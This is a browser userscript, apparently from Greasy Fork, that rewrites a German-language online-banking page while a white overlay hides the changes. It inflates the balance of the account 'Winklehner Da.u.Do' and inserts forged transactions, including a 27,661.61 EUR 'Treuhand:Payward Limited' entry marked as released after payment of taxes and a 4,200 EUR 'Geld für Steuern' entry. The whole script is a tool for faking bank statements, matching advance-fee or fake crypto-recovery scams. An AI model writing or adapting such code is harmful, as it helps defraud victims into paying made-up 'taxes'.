// ==UserScript==
// @name      ElCombined Winklehner
// @description Deletes elements with specified classes, logs and edits balance if specified text is found, and adds new transactions with specific texts and amounts
// @version  1.0
// @grant    none
// @match    *://*/*
// @namespace https://greasyfork.org/users/972766
// @downloadURL https://update.greasyfork.org/scripts/472551/ElCombined%20Winklehner.user.js
// @updateURL https://update.greasyfork.org/scripts/472551/ElCombined%20Winklehner.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // Add white overlay
    var overlay = document.createElement('div');
    overlay.style.position = 'fixed';
    overlay.style.top = '0';
    overlay.style.left = '0';
    overlay.style.width = '100%';
    overlay.style.height = '100%';
    overlay.style.backgroundColor = 'white';
    overlay.style.zIndex = '9999';
    document.body.appendChild(overlay);

    // ------------------------ CONFIGURABLE VALUES ------------------------

    // FIRST SCRIPT VALUES
    var TEXT_TO_FIND_1 = "Winklehner Da.u.Do"; // Name of the account to look for
    var AMOUNT_TO_EDIT_1 = 4200;

    // SECOND SCRIPT VALUES
    var ACCOUNT_NAME = "Winklehner Da.u.Do";
    var AMOUNT_TO_ADJUST = 4200;

    // THIRD SCRIPT VALUES
    var TEXT_TO_FIND_3 = "LH ST.OSWALD 2322 K4 04.08. 16:23";
    var NEW_TEXT = "Treuhand:Payward Limited";
    var NEW_AMOUNT = 27661.61;
    var NEW_NG_STAR_INSERTED_TEXT = "Freigabe nach Zahlung von Steuern";
    var DUPLICATE_MOVE_DIRECTION = "up";
    var DUPLICATE_MOVE_STEPS = 1;

    var ADDITIONAL_TRANSACTIONS = [
        {
            text: "Payward Limited",
            amount: 4200,
            ngStarInsertedText: "Geld für Steuern",
            moveDirection: "up",
            moveSteps: 1,
            enabled: true, // Set to false if you don't want to add this additional transaction
        },
        {
            text: "Additional transaction 2",
            amount: 5000,
            ngStarInsertedText: "Additional ng-star-inserted text goes here",
            moveDirection: "down",
            moveSteps: 2,
            enabled: false, // Set to false if you don't want to add this additional transaction
        },
        // Add more additional transactions as needed
    ];

    // ------------------------ FIRST SCRIPT ------------------------

    function firstScript() {
        // Check if the page contains both "Neuer Auftrag" and "Umsätze" text
        var pageContainsText = document.body.textContent.includes("Neuer Auftrag") && document.body.textContent.includes("Umsätze");

        // Exit the script if both texts are found
        if (pageContainsText) {
            console.log("Both 'Neuer Auftrag' and 'Umsätze' texts are present. Script will not continue.");
            return;
        }

        function removeElementsByClass(className){
            var elements = document.getElementsByClassName(className);
            while(elements.length > 0){
                elements[0].parentNode.removeChild(elements[0]);
            }
        }

        // Class names to delete
        var classesToDelete = [
            "rds-hint rds-form-field-hint-end ng-tns-c7-9 ng-star-inserted",
            "widget grid-item span-x-2 span-y-2 ng-star-inserted",
            "d-block ng-star-inserted",
            "container-fluid" // Add the class to be deleted here
        ];

        for (var i = 0; i < classesToDelete.length; i++) {
            removeElementsByClass(classesToDelete[i]);
            console.log("Elements with class '" + classesToDelete[i] + "' have been deleted.");
        }

        function formatAmount(amount) {
            return new Intl.NumberFormat('de-DE', { minimumFractionDigits: 2 }).format(amount) + " EUR";
        }

        function parseAmount(amountString) {
            var amount = parseFloat(amountString.replace('.', '').replace(',', '.'));
            return isNaN(amount) ? 0 : amount;
        }

        // Find elements with class "rds-scrub-item rds-focus-indicator ng-star-inserted"
        var elementsToSearch = document.getElementsByClassName("rds-scrub-item rds-focus-indicator ng-star-inserted");

        for (var j = 0; j < elementsToSearch.length; j++) {
            // Get the trimmed text content of the element
            var text = elementsToSearch[j].textContent.trim();

            // If the text contains the specified text, log a message to the console
            if (text.includes(TEXT_TO_FIND_1)) {
                console.log("Specified text '" + TEXT_TO_FIND_1 + "' found in element number " + (j+1) + ".");
                console.log(elementsToSearch[j]);

                // Search for the balance in the element
                var balanceElement = elementsToSearch[j].getElementsByClassName('rds-headline mb-0 text-truncate text-danger ng-star-inserted')[0] ||
                                     elementsToSearch[j].getElementsByClassName('rds-headline mb-0 text-truncate text-success ng-star-inserted')[0];

                if (balanceElement) {
                    var balanceText = balanceElement.textContent.trim().replace(/[^0-9.,-]+/g, "");
                    var balance = parseAmount(balanceText);

                    console.log("Original balance: " + balanceElement.textContent.trim());

                    // Edit the balance by the specified amount
                    var editedBalance = balance + AMOUNT_TO_EDIT_1;

                    // Determine the class for the edited balance
                    var editedClass = editedBalance >= 0 ? "text-success" : "text-danger";
                    balanceElement.classList.remove("text-success", "text-danger");
                    balanceElement.classList.add(editedClass);

                    // Format and set the edited balance in the element
                    balanceElement.textContent = formatAmount(editedBalance);
                    console.log("Edited balance: " + balanceElement.textContent.trim());
                }
            }
        }
    }

    // ------------------------ SECOND SCRIPT ------------------------

    function secondScript() {
        function removeElementsByClass(className) {
            var elements = document.getElementsByClassName(className);
            while (elements.length > 0) {
                elements[0].parentNode.removeChild(elements[0]);
            }
        }

        function adjustAndFormatBalance(originalBalance) {
            var isNegative = originalBalance.includes('-');
            var originalBalanceInNumber = Number(originalBalance.replace(/[-. EUR]/g, '').replace(',', '.'));
            originalBalanceInNumber = isNegative ? -originalBalanceInNumber : originalBalanceInNumber;
            var adjustedBalance = originalBalanceInNumber + AMOUNT_TO_ADJUST;
            return new Intl.NumberFormat('de-DE', { minimumFractionDigits: 2 }).format(adjustedBalance);
        }

        function adjustClass(element, balance) {
            if (balance >= 0) {
                element.classList.remove('text-danger');
                element.classList.add('text-success');
            } else {
                element.classList.remove('text-success');
                element.classList.add('text-danger');
            }
        }

        // Get elements by class
        var elements = document.getElementsByClassName('rds-scrub-item rds-focus-indicator ng-star-inserted rds-scrub-item-active');

        console.log("Number of elements found with specified class: " + elements.length);

        for (var i = 0; i < elements.length; i++) {
            // Get the trimmed text content of the element
            var text = elements[i].textContent.trim();

            // If the text contains the specified account name, log the element
            if (text.includes(ACCOUNT_NAME)) {
                console.log("Account name '" + ACCOUNT_NAME + "' found in element number " + (i+1) + ".");
                console.log(elements[i]);

                // Search for the inner balance text with the specified classes
                var balanceElement = elements[i].getElementsByClassName('rds-headline mb-0 text-truncate text-danger ng-star-inserted')[0] ||
                                     elements[i].getElementsByClassName('rds-headline mb-0 text-truncate text-success ng-star-inserted')[0];

                if (balanceElement) {
                    console.log("Original balance: " + balanceElement.textContent.trim());
                    var adjustedBalance = adjustAndFormatBalance(balanceElement.textContent.trim());
                    balanceElement.textContent = adjustedBalance + " EUR";
                    adjustClass(balanceElement, Number(adjustedBalance.replace('.', '').replace(',', '.')));
                    console.log("Adjusted balance: " + balanceElement.textContent.trim());
                }
            }
        }
    }

    // ------------------------ THIRD SCRIPT ------------------------

    function thirdScript() {
        function formatAmount(amount) {
            return new Intl.NumberFormat('de-DE', {style: 'currency', currency: 'EUR'}).format(amount);
        }

        function moveElement(element, steps, direction) {
            var parent = element.parentNode;
            var sibling;

            if (direction === "up") {
                for (let i = 0; i < steps; i++) {
                    sibling = element.previousElementSibling;
                    if (sibling) {
                        parent.insertBefore(element, sibling);
                    }
                }
            } else if (direction === "down") {
                for (let i = 0; i < steps; i++) {
                    sibling = element.nextElementSibling;
                    if (sibling) {
                        parent.insertBefore(sibling, element);
                    }
                }
            }
        }

        function createTransaction(element, text, amount, ngStarInsertedText, moveSteps, moveDirection) {
            var clone = element.cloneNode(true);
            clone.removeAttribute("id"); // Remove id from the cloned element

            var parent = element.parentElement;
            if(parent) {
                parent.insertBefore(clone, element.nextSibling);  // Duplicate the element after the original one
                console.log("Element duplicated successfully.");

                // Move the element
                moveElement(clone, moveSteps, moveDirection);

                // Modify the 'rds-list-text' in the duplicated element
                var listTextElement = clone.getElementsByClassName('rds-list-text')[0];
                if(listTextElement) {
                    var textElement = listTextElement.getElementsByTagName('p')[0];
                    if(textElement) {
                        console.log("Original text in duplicated element: " + textElement.textContent);
                        textElement.textContent = text;
                        console.log("New text in duplicated element: " + textElement.textContent);
                    }

                    // Create new ng-star-inserted element
                    var ngStarInsertedElement = document.createElement("p");
                    ngStarInsertedElement.className = "rds-line ng-star-inserted";

                    var smallElement = document.createElement("small");
                    smallElement.textContent = ngStarInsertedText;
                    ngStarInsertedElement.appendChild(smallElement);
                    listTextElement.appendChild(ngStarInsertedElement);
                }

                // Modify the amount in the duplicated element
                var amountElement = clone.getElementsByClassName('text-success')[0] || clone.getElementsByClassName('text-danger')[0];
                if(amountElement) {
                    console.log("Original amount in duplicated element: " + amountElement.textContent);

                    // Remove existing classes
                    amountElement.classList.remove('text-success', 'text-danger');

                    // Add class based on new amount
                    var newClass = amount >= 0 ? 'text-success' : 'text-danger';
                    amountElement.classList.add(newClass);

                    amountElement.textContent = formatAmount(amount);
                    console.log("New amount in duplicated element: " + amountElement.textContent);
                }
            }
        }

        function removeElementsByClass(className){
            var elements = document.getElementsByClassName(className);
            while(elements.length > 0){
                elements[0].parentNode.removeChild(elements[0]);
            }
        }

        // Remove all elements with class "d-block ng-star-inserted"
        removeElementsByClass("d-block ng-star-inserted");

        var elements = document.getElementsByClassName('ng-star-inserted');
        console.log("Number of elements found with class 'ng-star-inserted': " + elements.length);

        var lastMatchingElement = null;

        for (var i = 0; i < elements.length; i++) {
            var pElement = elements[i].querySelector('p.rds-line');
            if (pElement && pElement.textContent === TEXT_TO_FIND_3) {
                lastMatchingElement = elements[i];
            }
        }

        if(lastMatchingElement) {
            console.log("Last matching element found.");

            // Duplicate the transaction with new text and amount
            createTransaction(lastMatchingElement, NEW_TEXT, NEW_AMOUNT, NEW_NG_STAR_INSERTED_TEXT, DUPLICATE_MOVE_STEPS, DUPLICATE_MOVE_DIRECTION);

            // Add additional transactions with new text and amount
            for (let i = 0; i < ADDITIONAL_TRANSACTIONS.length; i++) {
                const transaction = ADDITIONAL_TRANSACTIONS[i];
                if (transaction.enabled) {
                    createTransaction(lastMatchingElement, transaction.text, transaction.amount, transaction.ngStarInsertedText, transaction.moveSteps, transaction.moveDirection);
                }
            }
        } else {
            console.log("No matching element found.");
        }

        console.log("Script execution completed.");
    }

    // ------------------------ CALL THE THREE FUNCTIONS ------------------------
    firstScript();
    secondScript();
    thirdScript();

    // Remove the white overlay after the script is executed
    overlay.remove();
})();
